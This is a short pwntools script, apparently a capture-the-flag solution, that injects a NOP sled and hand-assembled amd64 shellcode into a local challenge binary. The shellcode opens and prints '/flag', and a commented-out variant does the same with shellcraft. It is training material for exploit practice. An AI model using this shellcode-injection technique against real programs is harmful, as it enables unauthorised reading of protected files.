from pwn import *

p = process("./challenge_binary")  
context(arch='amd64', os='linux')  

shellcode = asm('''
    .rept 800
        nop
    .endr

    movabs rax, 0x101010101010101
    push rax
    movabs rax, 0x101016606d672e
    xor QWORD PTR [rsp], rax
    push 0x2
    pop rax
    mov rdi, rsp
    xor esi, esi
    syscall

    mov r10d, 0x7fffffff
    mov rsi, rax
    push 0x28
    pop rax
    push 0x1
    pop rdi
    cdq
    syscall                         
''')

p.sendline(shellcode)
print(p.recvall())


""" 
from pwn import *

p = process("/challenge/shellcode-injection-level1.1") 
context(arch='amd64', os='linux')  

nop = asm(shellcraft.nop())
shellcode = asm(shellcraft.cat('/flag'))
p.sendline(nop*0x801 + shellcode)

print(p.recvall()) 
"""
